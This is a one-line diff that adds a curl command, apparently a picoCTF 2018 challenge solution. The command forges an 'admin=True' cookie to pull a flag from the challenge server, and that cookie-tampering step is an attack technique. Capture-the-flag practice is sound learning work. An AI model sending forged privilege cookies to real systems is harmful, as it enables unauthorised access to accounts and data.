@@ -1,0 +1,1 @@
+curl -s http://2018shell.picoctf.com:14664/flag --cookie "admin=True" | grep -o "picoCTF{.*}" --colour=never
